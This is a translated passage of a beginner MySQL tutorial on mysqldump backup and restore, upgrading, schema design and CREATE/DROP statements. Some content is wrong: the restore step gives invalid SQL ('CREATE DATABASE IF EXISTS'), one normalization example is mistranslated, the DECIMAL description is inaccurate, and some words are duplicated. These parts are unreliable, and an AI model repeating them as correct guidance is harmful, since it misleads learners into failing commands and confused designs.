  \n## 在 Windows 上备份\n\n若要在 Windows 中为你的数据库创建备份副本，请按照以下步骤操作：\n\n1. 打开命令提示符窗口。\n例如，选择“开始”⇒“所有程序”⇒“附件”⇒“命令提示符”。\n\
  2. 到 MySQL 安装目录下的 `bin` 子目录。\n例如，在命令提示符中输入 `cd c:\\Program Files\\MySQL\\MySQL Server\
  \ 5.0\\bin`。\n3. 输入以下内容：\n\n```\nmysqldump --user=accountname --password=password\
  \ databasename >path\\backupfilename\n```\n\n## 在 Linux、Unix 和 Mac 上备份\n\n按照以下步骤在\
  \ Linux、Unix 或 Mac 上为你的数据库创建备份副本：\n\n1. 切换到 MySQL 安装目录下的 `bin` 子目录。\n例如，输入 `cd /usr/local/mysql/bin`。\n\
  2. 输入以下内容：\n\n```\nmysqldump --user=accountname --password=password databasename\
  \ >path/backupfilename\n```\n\n在上述代码中，请进行以下替换：\n* `accountname`：替换为你用于备份数据库的 MySQL\
  \ 账户。\n* `password`：使用该账户的密码。\n* `databasename`：使用你想备份的数据库名称。\n* `path/backupfilename`：将\
  \ `path` 替换为你想要存储备份的目录，将 `backupfilename` 替换为你想要存储 SQL 输出的文件名。\n\n![tip.eps](img/tip_fmt.png)\
  \ 你使用的账户需要具有 `SELECT` 权限。如果账户不需要密码，可以省略整个密码选项。\n\n你可以在同一行内输入命令而无需按回车键。或者你也可以输入反斜杠\
  \ (`\\`)，按回车键，然后在另一行继续输入命令。\n\n例如，备份 `PetCatalog` 数据库，你可能会使用以下命令：\n\n```\nmysqldump\
  \ --user=root --password=secret PetCatalog \\\n>/usr/local/mysql/backups/PetCatalogBackup\n\
  ```\n\n注意：在 Linux 或 Unix 上，你登录的账户必须具有向备份目录写入文件的权限。\n\n![remember.eps](img/remember_fmt.png)\
  \ 你必须在一行内输入 `mysqldump` 命令而无需按回车键。\n\n在上述代码中，请进行以下替换：\n* `accountname`：输入你用于备份数据库的\
  \ MySQL 账户名。你使用的账户需要具有 `SELECT` 权限。如果账户不需要密码，可以省略整个密码选项。\n* `password`：使用该账户的密码。\n\
  * `databasename`：替换为你想备份的数据库名称。\n* `path\\backupfilename`：将 `path` 替换为你想要存储备份的目录，并使用\
  \ `backupfilename` 替换为存储 SQL 输出的文件名。\n\n例如，备份 `ProductCatalog` 数据库，你可能会使用以下命令：\n\
  \n```\nmysqldump --user=root ProductCatalog >ProdCatalogBackup\n```\n\n## 恢复你的数据\n\
  \n在某个时刻，你的某个数据库表可能会损坏并无法使用。这并不寻常，但确实会发生。例如，硬件问题或意外的计算机关机会导致表损坏。有时，数据中让 MySQL 困惑的异常会导致表损坏。在某些情况下，损坏的表会导致你的\
  \ MySQL 服务器关闭。\n\n这是一个信号表损坏的典型错误消息：\n\n```\nIncorrect key file for table: 'tablename'.\n\
  ```\n\n你可以用备份副本中存储的数据替换损坏的表。\n\n然而，在某些情况下，数据库可能会完全丢失。例如，如果存放数据库的计算机发生故障无法修复，你当前的数据库就丢失了——但你的数据并没有永远消失。你可以用一台新计算机替换旧计算机，并从备份副本中恢复数据库。\n\
  \n你可以用存储在备份副本中的数据库替换你当前的数据库表。备份副本包含了创建副本时的数据快照。当然，你不会获得自备份创建之后对数据库的任何更改；你必须手动重新创建这些更改。\n\
  \n再次，如果你通过 IT 部门或 Web 托管公司访问 MySQL，你需要请求 MySQL 管理员从备份恢复你的数据库。如果你是 MySQL 管理员，可以自己进行恢复。\n\
  \n正如我们在本微型书籍的第 1 章 中描述的，你通过创建数据库然后向数据库添加表来构建数据库。`mysqldump` 实用程序创建的备份如备份你的数据库 节所述，是一个包含了重建表所需的所有\
  \ SQL 语句的文件，但它不包含创建数据库本身的语句。\n\n若要从备份文件恢复数据库，你必须先编辑备份文件，按以下步骤操作：\n\n1. 用文本编辑器打开备份文件。\n\
  2. 找到显示版本的行。\n3. 如果你想重建整个数据库，在第 2 行下方添加以下语句：\n```\nCREATE DATABASE IF EXISTS databasename\n\
  ```\n4. 在第 3 行下方，添加一行指定要向其使用的数据库：\n```\nUSE databasename\n```\n5. 检查重建表的语句块。如果你不想重建某个表，请在每行的开头添加\
  \ `--`（两个连字符）。这些连字符会将该行标记为注释。\n6. 检查每个表的 `INSERT` 语句。如果你不想向任何表添加数据，请注释掉插入数据的行。\n\
  7. 保存备份文件。\n\n当备份文件包含了用于重建数据库或表的语句后，你可以使用 `mysql` 客户端执行备份文件中的语句。只需按照以下步骤操作：\n\n\
  1. 从命令行提示符切换到 MySQL 安装目录下的 `bin` 子目录。\n![remember.eps](img/remember_fmt.png) 在 Windows\
  \ 上，如本微型书籍第 1 章 所述，你打开命令提示符来使用 `mysql` 客户端。输入 `cd` 命令切换到正确的目录。例如，你可能会输入 `cd /usr/local/mysql/bin`\
  \ 或 `cd c:\\Program Files\\MySQL\\MySQL Server 5.0\\bin`。\n2. 输入命令（发送备份文件中的 SQL\
  \ 查询）：\n\n```\nmysql -u accountname -p < path/backupfilename\n```\n你将 `accountname`\
  \ 替换为具有 `CREATE` 权限的账户。如果账户不需要密码，省略 `-p`。如果你使用了 `-p`，系统会提示密码。使用备份文件的完整路径和文件名。例如，你可以使用此命令恢复\
  \ `ProductCatalog` 数据库：\n\n```\nmysql -u root -p < c:\\Program Files\\MySQL\\MySQL\
  \ Server 5.0\\bin\\bak\\ProductCatalog.bak\n```\n\n\n\n您的数据库现在已恢复，其中包含了创建备份时时的所有数据。如果数据在创建备份后发生了变化，您将丢失这些更改。例如，如果在创建备份副本后添加了更多数据，则这些新数据将不会被恢复。如果您知道创建备份后进行了哪些更改，你可以在恢复的数据库中手动进行这些更改。\n\
  \n# 升级 MySQL\n\nMySQL 的新版本会定期发布，您可以从一个 MySQL 版本升级到较新版本。您可以在 MySQL 手册的 [`http://dev.mysql.com/doc/refman/5.5/en/upgrading.html`](http://dev.mysql.com/doc/refman/5.5/en/upgrading.html)\
  \ 中中找到升级信息。\n\n然而，在升级时有一些特别的注意事项。作为预防措施，在升级之前，请备份您的当前数据库，包括 `mysql` 数据库中的 `GRANT`\
  \ 表。\n\n![tip.eps](img/tip_fmt.png) MySQL 建议您不要跳跃版本。如果您想从一个版本升级到比当前版本新两个版本（例如从 MySQL\
  \ 4.0 升级到 MySQL 5.0），您应该先升级到下一个版本。在该版本运行正常后，您可以再升级到下一个版本，以此此类推。换句话说，从 4.0 升级到 4.1，然后从\
  \ 4.1 升级到 5.0。\n\nMySQL 新版本偶尔会引入不兼容的更改。某些版本引入了 `GRANT` 表结构的更改。例如，MySQL 4.1 更改了密码加密的方法，要求在\
  \ `GRANT` 表中使用更长的密码字段。\n\n升级到较新版本后，您应该运行 `mysql_upgrade` 脚本。它会修复您的并在并在时升级系统表。在 MySQL\
  \ 5.0.19 之前的版本中，`mysql_upgrade` 脚本不在 Windows 上运行；仅在 Unix 上运行。在 Windows 上，对于 5.0.19\
  \ 之前的 MySQL 版本，您可以运行名为 `mysql_fix_privileges_tables` 的脚本。该脚本会升级系统表，但不会执行 `mysql_upgrade`\
  \ 执行的完整表检查和修复。\n\n# 第 3 章：设计与构建数据库\n\n### 本章\n\n* ![arrow.png](img/arrow.png) 规划您的数据库\n\
  * ![arrow.png](img/arrow.png) 设计示例数据库\n* ![arrow.png](img/arrow.png) 构建您的数据库\n*\
  \ ![arrow.png](img/arrow.png) 重新结构您的数据库\n\n创建数据库的第一步是设计它。在您敲键盘创建数据库之前，必须先对其进行设计。规划也许是最重要的一步。如果在构建数据库并投入使用后发现它没有包含所有所需数据，或者没有提供您需要的数据关系，那是非常痛苦的，因此在本章中，我们将为您提供一些建议，帮助您设计一个运行良好的数据库。\n\
  \n完成数据库设计后，您就可以构建该数据库了，我们将在本章稍后部分告诉您如何操作。您将根据开发的方案来创建数据库及其表。构建完成后，您将拥有一个实用的空数据库，等待您填充数据。然后，您可以阅读本微型书籍的第\
  \ 4 章 来了解如何添加和检索数据。\n\n## 设计数据库\n\n设计数据库包括识别您需要的数据，并按照数据库软件的要求组织数据。在规划数据库设计时，您还需要为每个表确定主键，以及表与表之间的相互关系。您还应该考虑将要在数据库中存储什么类型的数据。\n\
  \n### 选择数据\n\n要设计数据库，您首先必须识别哪些信息属于其中。数据库必须包含网站实现其目的所需的数据。\n\n以下是几个例子：\n\n* ![check](img/check.png)\
  \ 在线目录需要一个包含产品信息的数据库。\n* ![check](img/check.png) 在线订购应用程序需要一个可以存放客户信息和订单信息的数据库。\n\
  * ![check](img/check.png) 旅游网站需要一个包含目的地、预订、票价、时间表等信息的数据库。\n\n在许多情况下，您的应用程序可能包含一个从用户那里收集信息的任务。例如，从网站购买产品的客户\
  \ 必须提供其地址、电话号码、信用卡信息和其他数据以完成订单。这些信息必须至少保存到订单填写完毕。通常，网站会保留客户信息以便于未来的订单，这样客户在下一次下单时就不需要重新输入信息。这些信息还为运营网站的企业提供了营销机会，例如向客户发送营销优惠或时事通讯。\n\
  \n一个客户数据库可能会收集以下客户信息：\n\n* ![check](img/check.png) 姓名\n* ![check](img/check.png)\
  \ 地址\n* ![check](img/check.png) 电话号码\n* ![check](img/check.png) 传真号码\n* ![check](img/check.png)\
  \ 电子邮件\n\n![warning_bomb.eps](img/warning_bomb_fmt.png) 您必须在收集所有能想到的潜在有用信息的冲动，与用户提供个人信息的抵触情绪（以及他们避开看起来太费时的表单）之间取得平衡。\n\
  \n一种折中方案是询问某些可选信息。不介意的用户可以输入这些信息，但反对的用户可以留空该部分。您还可以提供激励：表单越长，您需要的激励就越强大，以激励用户填写表单。例如：用户可能会为了赢得好莱坞之旅而愿意填写抽奖表单。\n\
  \n![tip.eps](img/tip_fmt.png) 花时间列出您需要在数据库中存储信息的完整列表。虽然您可以在开发数据库后更改并添加信息，但从一开始就包含这些信息更容易，并且可以避免后期更改数据库的额外工作。此外，如果您在数据库在使用后才添加信息，那么已经填写了表单并进入数据库的用户信息是不完整的。例如，如果您更改了表单现在询问年龄，那么已经在数据库中的人就没有年龄。\n\
  \n### 组织数据\n\nMySQL 是关系型数据库管理系统（RDBMS），这意味着数据被组织成表。（有关 MySQL 如何工作的更多信息，请参阅本微型书籍的第\
  \ 1 章\n\n行与交叉的单个单元格被称为字段。\n\n每个表的核心是您想要存储信息的对象（实体）。以下是一些对象的例子：\n\n* ![check](img/check.png)\
  \ 客户\n* ![check](img/check.png) 产品\n* ![check](img/check.png) 公司\n* ![check](img/check.png)\
  \ 动物\n* ![check](img/check.png) 城市\n* ![check](img/check.png) 房间\n* ![check](img/check.png)\
  \ 书籍\n* ![check](img/check.png) 计算机\n* ![check](img/check.png) 形状\n* ![check](img/check.png)\
  \ 文档\n* ![check](img/check.png) 项目\n* ![check](img/check.png) 周\n\n您为每个对象创建一个表。表名应根据以下指南，使用描述性单词或术语清晰地标识它所包含的对象：\n\
  \n* ![check](img/check.png) 名称必须是一个字符串，包含字母、数字、下划线或美元符号，但不能包含空格。\n\n\n\n\n![check](img/check.png)\
  \ 习惯上使用单数形式命名表。因此，客户表可以命名为 `Customer`，而包含客户订单的表可以命名为 `CustomerOrder`。\n\n![check](img/check.png)\
  \ 大小写在 Linux 和 Unix 上非常敏感，但在 Windows 上不是。对于 Windows 来说，`CustomerOrder` 和 `Customerorder`\
  \ 是相同的——但对于 Linux 或 Unix 则不是。尽管如此，为了防止将来需要更改托管平台，最好对大小写保持敏感。\n\n在数据库术语中，对象（object）是一个实体（entity），而实体具有属性（attributes）。在表中，每行代表一个实体，而每一列都包含每个实体的属性。例如，在客户表中，每行包含一个客户的信息。列中包含的某些属性可能包括姓、名、电话号码和年龄。\n\
  \n按照以下步骤决定如何将数据组织成表：\n\n### 1. 为你的数据库命名。\n为你的应用程序分配一个数据库名称。例如，你可以将包含某个社区家庭信息的数据库命名为\
  \ `HouseholdDirectory`。\n\n### 2. 识别对象。\n查看你想要存储在数据库中的信息列表（如上一节所述）。分析你的列表并识别对象。例如，`HouseholdDirectory`\
  \ 数据库可能需要存储以下内容：\n* 每个家庭成员的名字\n* 家庭地址\n* 电话号码\n* 每个家庭成员的年龄\n* 每个家庭成员最喜爱的早餐麦片\n\n\
  当你仔细分析这个列表时，你会发现你正在存储关于两个对象的信息：家庭和家庭成员。地址和电话号码通常针对整个家庭，但名字、年龄和喜爱的麦片是针对每个特定家庭成员的。\n\
  \n### 3. 为每个对象定义并命名表。\n例如，`HouseholdDirectory` 数据库需要一个名为 `Household` 的表和一个名为 `HouseholdMember`\
  \ 的表。\n\n### 4. 每个对象的属性。\n分析你的信息列表，并识别你需要为每个对象存储的属性。将要存储的信息拆分为最小的合理单元。例如，在表中存储一个人的姓名时，你可以将姓名拆分为名和姓。这样做可以让你根据姓进行排序，而如果将姓和名存储在一起，这样做将困难得多。你甚至可以将姓名拆分为名、中间名和姓，尽管许多应用程序并不单独使用中间名。\n\
  \n### 5. 为你在第 4 步中识别的每个独立属性定义并命名列。\n为每一列提供一个能够清晰标识该列信息的名称。列名应为一个单词，且没有空格。例如，你可能会有名为\
  \ `firstName` 和 `lastName` 或 `first_name` 和 `last_name` 的列。\n\n![remember.eps](img/remember_fmt.png)\
  \ MySQL 和 SQL 保留了一些单词供内部，你不能将这些单词作为列名。这些单词目前用于 SQL 语句或预留供以后使用。你不能将 `ADD`、`ALL`、`AND`、`CREATE`、`DROP`、`GROUP`、`ORDER`、`RETURN`、`SELECT`、`SET`、`TABLE`、`USE`、`WHERE`\
  \ 以及更多更多。请参见在线 MySQL 手册 `http://dev.mysql.com/doc/refman/5.5/en/reserved-words.html`。\n\
  \n### 6. 识别主键。\n表中的每行都需要一个唯一标识符。表中没有两行完全相同。在设计表时，你决定哪一列持有唯一标识符，该标识符称为主键（primary\
  \ key）。\n\n主键可以是多个列的组合。在许多情况下，你的对象属性没有唯一标识符。例如，客户表可能没有唯一标识符，因为两个客户可能有相同的名字。当你没有唯一标识符列时，你需要专门添加一列作为主键。通常，使用一个带有序列号的列用于此目的。例如，在表\
  \ 3-1 中，主键是 `cust_id` 字段，因为每个客户都有一个唯一的 ID 号。\n\n![Table 3-1](img/9781118213704-tb050302.png)\n\
  \n### 7. 定义默认值。\n你可以定义一个默认值，当未向字段输入任何数据时，MySQL 会为其分配该默认值。你不需要默认值，但它通常很有用。例如，如果你的应用程序存储了包含国家的地址，你可以指定\
  \ `U.S.` 为默认值。如果用户没有输入国家，MySQL 将输入 `U.S.`。\n\n### 8. 识别需要数据的列。\n你可以指定某些列不允许为空（也称为\
  \ `NULL`）。例如，包含主键的列不能为空。如果主键列中没有存储值，MySQL 将不会创建该行并返回错误消息。该值可以是空格或空字符串（例如 `\"\"`），但列中必须存储某些值。除了主键外，你还可以设置其他列需要数据。\n\
  \n![warning_bomb.eps](img/warning_bomb_fmt.png) 设计良好的数据库将会将每条信息存储在一个处。将其存储在多个处是低效的，并且在需要更改信息时会产生问题。如果你在一个地方更改了信息但在另一个地方忘记更改，你的数据库可能会出现严重问题。\n\
  \n![tip.eps](img/tip_fmt.png) 如果你发现自己在多行中存储相同的数据，你可能需要重新组织你的表。例如，假设你正在存储书籍的信息，包括出版者的地址。当你输入数据时，意识到自己在很多行中输入了相同的出版者地址。更有效的存储方法是将书籍信息存储在一个表中，将书籍信息存储在另一个表中。你可以定义两个表：`Book`\
  \ 和 `BookPublisher`。在 `Book` 表中，你将拥有 `title`、`author`、`pub_date` 和 `price` 列。在 `BookPublisher`\
  \ 表中，你将拥有 `name`、`streetAddress` 和 `city` 列。\n\n#### 创建表之间的关系\n数据库中的某些表是关联的。通常，一个表中的行与另一个表中的若干行相关。你需要一列来连接不同表中的行。在许多情况下，你在一个表中包含一列，以匹配另一个表主键列中的数据。\n\
  \n一个需要两个关联表的常见应用程序是客户订单应用程序。例如，一个表包含客户信息，如姓名、地址和电话号码。每个客户可以有零到多个订单。你可以将订单信息存储在客户信息表中，但每当客户下单时就会创建一个新行，且每个新行都包含所有客户的信息。你可以更有效地将订单存储在单独的表中，可能名为\
  \ `CustomerOrder`。（你不能将表命名为 `Order`，因为那是保留字。）在 `CustomerOrder` 表中，你包含一个来自 `Customer`\
  \ 表行主键的列，以便订单与 `Customer` 表的正确行相关。这种关系显示在表 3-1（本章前面的部分）和表 3-2 中。\n\n\n\n\n在本示例中\
  \ `Customer` 表如 表 3-1 所示。每个客户都有唯一的 `cust_id`。相关的 `CustomerOrder` 表如 表 3-2 所示。它具有与\
  \ `Customer` 表中相同的 `cust_id` 列。通过该列，`CustomerOrder` 表中的订单信息可以连接到 `Customer` 表中相关的客户名称和电话号码。\n\
  \n![Table 3-2](img/9781118213704-tb050303.png)\n\n在本示例中，关联 `Customer` 表和 `CustomerOrder`\
  \ 表的列具有相同的名称。它们可以使用不同的名称，只要这些列包含相同的数据即可。\n\n## 存储不同类型的数据\n\nMySQL 根据你告诉 MySQL 预期的信息类型，以不同的格式存储信息。MySQL\
  \ 允许以不同的方式使用不同类型的数据。主要的数据类型有字符、数值以及日期和时间数据。我们将描述这些和其他数据类型，然后告诉你如何在每列中指示你正在使用的数据类型。\n\
  \n### 字符数据\n\n最常见的数据类型是字符数据（以字符字符串存储的数据），它只能在字符串中进行操作。你存储的大部分信息都是字符数据——例如客户名称、地址、电话号码和宠物描述。你可以移动和打印字符数据。可以将两个字符字符串拼接在一起，从较长的字符串中选择子字符串，并用一个字符串替换另一个。\n\
  \n字符数据可以以固定长度或变长度的格式存储：\n\n![check](img/check.png) 固定长度格式：在这种格式下，MySQL 为数据预留了固定空间。如果数据超过固定长度，则只存储符合长度的字符——末尾的字符不会被存储。如果字符串比固定长度短，则额外的空间将留空并浪费。\n\
  \n![check](img/check.png) 变长度格式：在这种格式下，MySQL 将字符串存储在与字符串长度相同的字段中。你指定了一个字符串长度，但如果字符串本身比指定的长度短，MySQL\
  \ 只使用所需的空间，而不是将额外的空间留空。如果字符串超过指定的空间，多出的字符将不会存储。\n\n如果字符字符串长度仅变化变化，请使用固定长度格式。例如，长度为十适用于所有邮政编码，包括带有\
  \ ZIP+4 号的。如果邮政编码不包含 ZIP+4 号，则只留五个空位。然而，如果你的字符字符串变化超过几个字符，请使用变长度格式以节省空间。例如，你的宠物描述可能是\
  \ `small bat`，也可能长达几行描述。通过以变长度格式存储此描述，你只使用必要的空间。\n\n### 数值数据\n\n另一种常见的数据类型是数值数据——以数字存储的数据。你可以存储小数（例如\
  \ 10.5, 2.34567, 23456.7）以及整数（例如 1, 2, 248）。当你将数据存储为数字时，可以在数值操作中使用该数据，如加法、减法和平方。然而，如果你不计划将数据用于数值操作，你应该将其存储为字符字符串，因为程序员将其作为字符字符串使用。不需要转换。\n\
  \nMySQL 存储正数和负数，但你可以告诉 MySQL 只存储正数。如果你的数据永远不会是负数，请将数据存储为无符号（数字前没有 + 或 – 符号）。例如，城市人口或文档的页数永远不可能是负数。\n\
  \nMySQL 提供了一种特定的数值列类型，称为自增列。在没有提供特定数字的情况下，这种列将自动填充顺序数字。例如，当向带有自增列为 `5` 的表中添加一条新行时，除非指定了不同的数字，否则下一行在该列中将自动分配\
  \ `6`。当你需要唯一数字（例如产品号或订单号）时，可能会发现自增列非常有用。\n\n### 日期和时间数据\n\n第三种常见的数据类型是日期和时间数据。存储为日期的数据可以用多种日期格式显示。你可以使用该数据来确定两个日期或两个时间之间的时间长度——或者特定日期或时间与某些任意日期或时间之间的时间。\n\
  \n### 枚举数据\n\n有时，数据可能只有有限的值。例如，一列的可能值可能是 `yes` 或 `no`。MySQL 提供了一种名为枚举（enumeration）的数据类型，用于此类数据。你告诉\
  \ MySQL 列中可以存储哪些值（例如 `yes` 和 `no`），MySQL 不会在该列中存储任何其他值。\n\n## MySQL 数据类型名称\n\n当你创建数据库时，通过使用\
  \ MySQL 的数据类型名称告诉 MySQL 在特定列中期望什么类型的数据。表 3-3 显示了 Web 应用程序中最常用的 MySQL 数据类型。\n\n表\
  \ 3-3 MySQL 数据类型\n\n| MySQL 数据类型 | 描述 |\n| :--- | :--- |\n| `CHAR(length)` | 固定长度字符字符串。\
  \ |\n| `VARCHAR(length)` | 变长度字符字符串。可以存储的最长字符串为 `length`，必须在 1 到 255 之间。 |\n| `TEXT`\
  \ | 最大长度为 64K 文本的变长度字符字符串。 |\n| `INT(length)` | 范围从 –2147483648 到 +2147483647 的整数。可显示的数字受\
  \ `length`。例如，如果 `length` 为 4，则只能显示 –999 到 9999 之间的数字，即使存储了更大的数字。 |\n| `INT(length)\
  \ UNSIGNED` | 范围从 0 到 4294967295 的整数。`length` 是可显示数字的大小。例如，如果 `length` 为 4，则只能显示\
  \ 0 到 9999 之间的数字，即使存储了更大的数字。 |\n| `BIGINT` | 大整数。有符号范围为 –9223372036854775808 到 9223372036854775807。无符号范围为\
  \ 0 到 18446744073709551615。 |\n| `DECIMAL(length,dec)` | 十进制，其中 `length` 是用于显示数字的字符数，`dec`\
  \ 是允许的最大位数。例如，12.34 的 `length` 为 5，`dec` 为 2。 |\n| `DATE` | 带有年、月、日的日期值。显示为 `YYYY-MM-DD`（例如，2013\
  \ 年 4 月 3 日显示为 `2013-04-03`）。 |\n| `TIME` | 带有小时、分、秒的时间值。显示为 `HH:MM:SS`。 |\n| `DATETIME`\
  \ | 日期和时间存储在一起。显示为 `YYYY-MM-DD HH:MM:SS`。 |\n| `ENUM (\"val1\",\"val2\"...)` | 只能存储列出的值。最多列出\
  \ 65535 个值。 |\n| `SERIAL` | `BIGINT UNSIGNED NOT NULL AUTO_INCREMENT` 的快捷名称。 |\n\
  \nMySQL 允许比表 3-3 中列出的许多数据类型，但你可能不经常需要其他数据类型。有关可用数据类型的描述，请参 MySQL 在线文档：`http://dev.mysql.com/doc/refman/5.6/en/data-types.html`。\n\
  \n## 设计示例数据库\n\n在本节中，我们设计了一个包含订单信息的示例数据库。我们将在本章后面以及本书的第 4 章](../Text/31_9781118213704-bk05ch04.html)\
  \ 中使用该数据库，展示如何构建和使用数据库。\n\n创建以下你想为每个客户存储的信息列表：\n\n![check](img/Imagescheck.png)\
  \ 姓名\n\n![check](img/check.png) 地址\n\n![check](img/check.png) 电话号码\n\n![check](img/check.png)\
  \ 传真号码\n\n![check](img/check.png) 电子邮件地址\n\n\n\n\n此外，你还需要收集客户了哪些产品的信息。对于每个订单，你需要收集以下信息：\n\
  \n![check](img/check.png) 下单日期\n\n![check](img/check.png) 订单中每个项目的产品信息\n\n在本示例中，产品是\
  \ T 恤。因此，对于每个项目你需要以下信息：\n\n* 识别特定产品的编号（例如目录编号）\n* 尺寸\n* 价格\n* 颜色\n\n你可以按照本章早期组织数据节介绍的步骤来设计\
  \ `Customer` 数据库，并考虑到这些信息：\n\n### 1. 为数据库命名。\n订单信息数据库命名为 `CustomerOrderInformation`。\n\
  \n### 2. 识别对象。\n信息列表如下：\n\n* 客户姓名\n* 客户地址\n* 客户电话号码\n* 客户传真号码\n* 客户电子邮件地址\n* 订单日期\n\
  * 识别特定产品的编号（例如目录编号）\n* 尺寸\n* 颜色\n* 价格\n\n前五项信息与客户有关，因此一个对象是 `Customer`。订单日期信息与整个订单有关，因此另一个对象是\
  \ `CustomerOrder`。其余四项信息与订单中的每个单独项目有关，因此剩余的对象是 `OrderItem`。\n\n### 3. 为每个对象定义并命名表。\n\
  `CustomerOrderInformation` 数据库需要以下表：\n\n* `Customer`\n* `CustomerOrder`\n* `OrderItem`\n\
  \n### 4. 识别每个对象的属性。\n详细查看信息列表：\n\n* Customer ID：1 个属性（每个客户的唯一 ID）。\n* 客户姓名：两个属性（姓和名）。\n\
  * 客户地址：四个属性（街道地址、城市、州/省份和邮政编码）。\n* 客户电话号码：1 个属性。\n* 客户传真号码：1 个属性。\n* 客户电子邮件地址：1\
  \ 个属性。\n* 订单号：1 个属性（每个订单的唯一 ID）。\n* 订单日期：1 个属性。\n* 识别特定产品的编号（例如目录编号）：1 个属性。\n* 尺寸：1\
  \ 个属性。\n* 颜色：1 个属性。\n* 价格：1 个属性。\n\n### 5. 定义并命名列。\n`Customer` 表每个客户拥有一行。`Customer`\
  \ 表的列为：\n\n* `customerID`\n* `firstName`\n* `lastName`\n* `street`\n* `city`\n*\
  \ `state`\n* `zip`\n* `email`\n* `phone`\n\n`CustomerOrder` 表每个订单有一行，包含以下列：\n\n\
  * `CustomerID`：此列将此表与 `Customer` 表关联。该值在 `Customer` 表中是唯一的，但在此表中不是唯一的。\n* `orderID`\n\
  * `orderDate`\n\n`OrderItem` 表每个订单中的每个项目有一行，包含以下列：\n\n* `catalogID`\n* `orderID`：此列将此表与\
  \ `CustomerOrder` 表关联。该值在 `CustomerOrder` 表中是唯一的，但在此表中不是唯一的。\n* `size`\n* `color`\n\
  * `price`\n\n### 6. 识别主键。\n`Customer` 表的主键是 `customerID`。因此，`customerID` 必须是唯一的。`CustomerOrder`\
  \ 表的主键是 `orderID`。`OrderItem` 表的主键是 `orderID` 和 `catalogID` 共同。\n\n### 7. 定义默认值。\n\
  任何表均未定义默认值。\n\n### 8. 识别需要数据的列。\n以下列永远不允许为空：\n\n* `customerID`\n* `orderID`\n* `catalogID`\n\
  \n这些列是主键列。永远不要允许表中出现缺少这些值的行。\n\n### 9. 决定存储每个属性的数据类型。\n\n* 数值：`CustomerID` 和 `orderID`\
  \ 是数值类型。\n* 日期：`OrderDate` 是日期类型。\n* 字符：所有剩余字段都是字符类型。\n\n# 编写你的设计\n\n在按照前面的描述仔细规划数据库之后，你就可以开始构建数据库了。数据库包含两个部分：存储数据的结构和数据本身。在接下来的章节中，我们将解释如何创建数据库结构。首先，你创建一个没有任何结构的空数据库，然后向其中添加表。\n\
  \n当你创建一个数据库时，会在数据目录中创建一个以分配的数据库命名的新子目录。稍后当你向数据库添加表时，文件会被添加到该子目录。数据目录通常是 MySQL 安装目录下的一个子目录。你可以通过\
  \ MySQL 配置文件 `my.cnf` 中添加如下格式的语句来设置不同的数据目录：\n\n```\ndatadir=c:/xampp/mysql/data\n\
  ```\n\n\n\n\n创建新数据库的第一步是创建一个空数据库并为其命名。你的数据库名称长度最多可达 64 个字符。你可以使用大多数字母、数字和标点符号，但有少数例外。通常情况下，你不能使用在操作系统目录名称中是非允许的字符（请查阅你的操作系统文档以确定这些字符是什么）。不要在名称末尾使用空格。不要在数据库名称（或表名）中使用正斜杠（`/`）或反斜杠（`\\\
  `）。你可以在数据库名称中使用引号，但这样做并非明智之举。\n\n要创建一个新的空数据库，请使用以下 SQL 语句：\n\n```sql\nCREATE DATABASE\
  \ databasename\n```\n\n在此语句中，将 `databasename` 替换为你为数据库指定的名称。例如，要创建本章设计的示例数据库，请使用以下\
  \ SQL 语句：\n\n```sql\nCREATE DATABASE CustomerOrderInformation\n```\n\n![tip.eps](img/tip_fmt.png)\
  \ 某些网络托管公司不允许你创建新数据库。主机会提供指定数量的 MySQL 数据库供使用，你只能在指定的数据库中创建表。你可以尝试请求额外的数据库，但你需要一个充分的理由。MySQL\
  \ 和 PHP 并不在乎所有的表是在一个数据库中，还是按有意义的名称组织在多个数据库中。当项目组织良好时，人类更容易跟踪项目。\n\n如果已经存在与你指定的名称相同的数据库，将返回错误消息。你可以通过在语句中使用\
  \ `IF` 短句来避免此错误消息，如下：\n\n```sql\nCREATE DATABASE IF NOT EXISTS CustomerOrderInformation\n\
  ```\n\n使用此语句，如果数据库不存在则创建它，但如果数据库已存在，语句也不会失败。它只是不会创建新数据库。\n\n若要亲眼确认是否确实创建了数据库，请使用\
  \ `SHOW DATABASES` SQL 查询。\n\n在创建空数据库后，你可以向其中添加表。（请查看本章稍后的添加表和指定主键 节。）\n\n## 创建和删除数据库\n\
  \n你可以删除任何数据库，只要你使用的是具有 `DROP` 权限的 MySQL 账户。当你删除一个数据库时，数据库中的所有表和数据也会被删除。\n\n你可以使用以下\
  \ SQL 语句删除数据库：\n\n```sql\nDROP DATABASE databasename\n```\n\n![warning_bomb.eps](img/warning_bomb_fmt.png)\
  \ 请谨慎使用 `DROP`，因为它是不可逆的。在你删除数据库后，该数据库将永久消失。它其中的任何数据也会随之消失。\n\n如果数据库不存在，将返回错误消息。你可以使用以下语句防止错误消息：\n\
  \n```sql\nDROP DATABASE IF EXISTS databasename\n```\n\n此语句会在该数据库存在时删除它。如果它不存在，则不会发生错误。语句将静静地结束。\n\
  \n## 添加表和指定主键\n\n你可以向任何数据库添加表，无论它是你刚刚创建的新的空数据库，还是已经包含表和数据的现有数据库。允许的表名的规则在在本章较早之前的组织数据\
  \ 节中解释。当你在数据库中创建表时，数据库目录会添加一个名为 `tablename.frm` 的文件。\n\n当你创建表时，需要包含表定义。你定义每一列——为它指定一个名称、分配一个数据类型并指定所需的任何其他定义。以下是经常为列指定的某些定义：\n\
  \n![check](img/check.png) `NOT NULL`: 此列必须有值；不能为空。\n\n![check](img/check.png) `DEFAULT\
  \ value`: 在创建行时，如果没有为列提供其他值，则该 `value` 将存储在列中。\n\n![check](img/check.png) `AUTO_INCREMENT`:\
  \ 此定义会创建一个序列号。随着每行的添加，此列的值将比上一行输入的值递增一个整数。你可以通过为列分配特定值来覆盖自动编号。\n\n![check](img/check.png)\
  \ `UNSIGNED`: 此定义表示该数值字段的值将永远不会是负数。\n\n你还为每行指定了唯一标识符——主键。表必须有一个字段或字段的组合，该组合对于每行都是不同的。没有两个行可以具有相同的主键。如果你尝试添加一个与表中已有行相同主键的行，将收到错误消息，且该行不会被添加。\n\
  \n偶尔，你可能想要创建一个与现有表结构相同的表。你可以创建一个空副本表。\n\n你可以使用 `CREATE` 语句向数据库添加表。该语句以 `CREATE TABLE`\
  \ 语句开头，如下：\n\n```sql\nCREATE TABLE tablename\n```\n\n然后，你添加带有定义的列名列表。用逗号将每列的信息与下一列的信息隔开。将整个列表封装在括号中。在每个列名后跟随其数据类型和所需的任何其他定义。\n\
  \n![remember.eps](img/remember_fmt.png) `CREATE TABLE` 语句中的最后一项指示哪一列或列的组合是主键。你使用以下格式指定主键：\n\
